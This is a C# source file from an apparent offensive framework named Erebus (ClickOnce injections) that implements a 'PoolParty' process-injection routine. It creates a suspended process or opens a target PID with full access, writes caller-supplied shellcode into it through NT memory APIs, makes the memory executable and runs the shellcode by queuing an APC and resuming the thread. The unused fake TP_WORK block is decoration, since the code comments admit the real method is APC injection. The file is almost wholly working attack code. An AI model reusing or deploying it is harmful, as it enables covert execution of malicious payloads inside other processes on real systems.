using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class PoolPartyInjection : IInjectionMethod
    {
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint THREAD_ALL_ACCESS = 0x1F03FF;
        public string Description => "Thread pool-based remote injection (APC-based hybrid variant)";
        public string Name => "PoolParty";

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;

            try
            {
                // If no PID specified, create a new process
                int pid;
                uint threadId = 0;

                if (targetPid == 0)
                {
                    DebugLogger.WriteLine("[*] Creating new target process (suspended)...");
                    Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    Win32.PROCESS_INFORMATION pi;

                    StringBuilder cmdLine = new StringBuilder(InjectionConfig.TargetProcess);

                    bool success = Win32.CreateProcess(
                        null!,
                        cmdLine,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        Win32.CREATION_FLAGS.CREATE_SUSPENDED | Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                        IntPtr.Zero,
                        null!,
                        ref si,
                        out pi);

                    if (!success)
                    {
                        DebugLogger.WriteLine($"[-] Failed to create process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    hProcess = pi.hProcess;
                    hThread = pi.hThread;
                    pid = pi.dwProcessId;
                    threadId = (uint)pi.dwThreadId;
                    DebugLogger.WriteLine($"[+] Target process created with PID: {pid}, TID: {threadId}");
                }
                else
                {
                    DebugLogger.WriteLine($"[*] Opening target process PID: {targetPid}");
                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);

                    if (hProcess == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] Failed to open process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    // Find the main thread
                    Process proc = Process.GetProcessById(targetPid);
                    if (proc.Threads.Count == 0)
                    {
                        DebugLogger.WriteLine("[-] No threads found in target process");
                        return false;
                    }

                    threadId = (uint)proc.Threads[0].Id;
                    hThread = OpenThread(THREAD_ALL_ACCESS, false, threadId);

                    if (hThread == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] Failed to open thread: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    pid = targetPid;
                    DebugLogger.WriteLine($"[+] Opened process PID: {pid}, using TID: {threadId}");
                }

                // Allocate memory for shellcode using NT API
                IntPtr baseAddress = IntPtr.Zero;
                IntPtr regionSize = new IntPtr(shellcode.Length);

                uint status = NtAllocateVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    IntPtr.Zero,
                    ref regionSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode to target process
                uint written;
                status = NtWriteVirtualMemory(
                    hProcess,
                    baseAddress,
                    shellcode,
                    (uint)shellcode.Length,
                    out written);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtWriteVirtualMemory failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Written {written} bytes to target process");

                // Change protection to executable
                IntPtr protectAddress = baseAddress;
                IntPtr protectSize = new IntPtr(shellcode.Length);
                uint oldProtect;

                status = NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref protectSize,
                    PAGE_EXECUTE_READ,
                    out oldProtect);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtProtectVirtualMemory failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine("[+] Memory protection changed to RX");

                // Allocate space for a fake TP_WORK structure (for future pool hijacking) This is
                // optional and demonstrates the "pool party" concept
                IntPtr tpWorkAddress = IntPtr.Zero;
                IntPtr tpWorkSize = new IntPtr(0x200);

                status = NtAllocateVirtualMemory(
                    hProcess,
                    ref tpWorkAddress,
                    IntPtr.Zero,
                    ref tpWorkSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);

                if (status == 0)
                {
                    DebugLogger.WriteLine($"[+] Allocated TP_WORK structure at: 0x{tpWorkAddress:X}");

                    // Create a fake TP_WORK structure pointing to shellcode
                    byte[] fakeTPWork = new byte[0x200];
                    // Set callback pointer at offset 0x30 (Windows 10/11)
                    byte[] addressBytes = BitConverter.GetBytes(baseAddress.ToInt64());
                    Array.Copy(addressBytes, 0, fakeTPWork, 0x30, addressBytes.Length);

                    status = NtWriteVirtualMemory(
                        hProcess,
                        tpWorkAddress,
                        fakeTPWork,
                        (uint)fakeTPWork.Length,
                        out written);

                    if (status == 0)
                    {
                        DebugLogger.WriteLine("[+] Fake TP_WORK structure written");
                    }
                }

                // Queue APC to execute shellcode This is the actual execution method (APC-based hybrid)
                status = NtQueueApcThread(
                    hThread,
                    baseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtQueueApcThread failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine("[+] APC queued to thread pool worker");

                // Resume the thread to execute the APC
                uint suspendCount;
                status = NtResumeThread(hThread, out suspendCount);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtResumeThread failed with NTSTATUS: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Thread resumed (previous suspend count: {suspendCount})");
                DebugLogger.WriteLine("[+] PoolParty injection completed successfully");

                // Give shellcode time to execute
                System.Threading.Thread.Sleep(2000);

                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] PoolParty injection failed: {ex.Message}");
                DebugLogger.WriteLine($"    Stack trace: {ex.StackTrace}");
                return false;
            }
            finally
            {
                // Cleanup handles
                if (hThread != IntPtr.Zero)
                {
                    NtClose(hThread);
                }
                if (hProcess != IntPtr.Zero)
                {
                    NtClose(hProcess);
                }
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtClose(IntPtr Handle);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtOpenProcess(
            out IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtResumeThread(
            IntPtr ThreadHandle,
            out uint SuspendCount);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            uint BufferLength,
            out uint NumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [StructLayout(LayoutKind.Sequential)]
        private struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
    }
}
